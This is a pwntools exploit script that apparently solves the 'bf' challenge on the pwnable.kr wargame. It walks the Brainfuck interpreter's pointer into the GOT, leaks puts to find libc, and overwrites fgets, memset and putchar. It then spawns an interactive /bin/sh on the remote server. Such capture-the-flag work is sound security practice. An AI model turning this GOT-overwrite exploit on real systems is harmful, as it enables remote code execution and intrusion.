from pwn import *


libc = ELF('./bf_libc.so')
binary = ELF('./bf')

puts_got_addr = binary.got['puts']
print("puts_got_address: 0x{:08x}".format(puts_got_addr))
putchar_got_addr = binary.got['putchar']
print("putchar_got_addr: 0x{:08x}".format(putchar_got_addr))
memset_got_addr = binary.got['memset']
print("memset_got_addr: 0x{:08x}".format(memset_got_addr))
fgets_got_addr = binary.got['fgets']
print("fgets_got_addr: 0x{:08x}".format(fgets_got_addr))

gets_virtual_addr = libc.symbols['gets']
print("gets_virtual_addr: 0x{:08x}".format(gets_virtual_addr))
system_virtual_addr = libc.symbols['system']
print("system_virtual_addr: 0x{:08x}".format(system_virtual_addr))
puts_virtual_addr = libc.symbols['puts']
print("puts_virtual_addr: 0x{:08x}".format(puts_virtual_addr))

p_address = 0x0804a0a0 
main_addr = 0x08048671
# Connection details
host = 'pwnable.kr'
# # host = 'localhost'
port = 9001

# context.log_level = 'debug'

# # Establish a remote connection
p = remote(host, port)
# p = process('./bf')

p.recvuntil(b'type some brainfuck instructions except [ ]\n') # get all begin data
# p.recv()

# print the real address of puts
payload = "<" * (p_address - puts_got_addr) 
payload += ".>" * 4

# override fgets_got to system
payload += "<" * (puts_got_addr - fgets_got_addr + 4)
payload += ",>" * 4 # change the address of plt_fgets to system

# override memset_got to gets
payload += ">" * (memset_got_addr - fgets_got_addr - 4) 
payload += ",>" * 4 # change the address of plt_memset to gets

# override putchar_got to main
payload += "<" * (putchar_got_addr - memset_got_addr - 4) 
payload += ",>" * 4 

# call putchar, which call main
payload += "."

p.sendline(payload)

inp = b''

for i in range(4):
    inp += p.recv(1)

puts_real_addr = u32(inp)
log.info("puts_real_addr: 0x{:08x}".format(puts_real_addr))
base_addr = puts_real_addr - puts_virtual_addr
log.info("base_addr: 0x{:08x}".format(base_addr))

# this will go to fgets
system_real_addr = base_addr + system_virtual_addr 
log.info("system_real_addr: 0x{:08x}".format(system_real_addr))
p.send(p32(system_real_addr))

# this will go to memset_got
gets_real_addr = base_addr + gets_virtual_addr 
log.info("gets_real_addr: 0x{:08x}".format(gets_real_addr))
p.send(p32(gets_real_addr)) 

# this will go to putchar_got
p.send(p32(main_addr)) 

p.send(b'/bin/sh\0') # put /bin/sh in the stack, using the get function

p.interactive()

p.close()
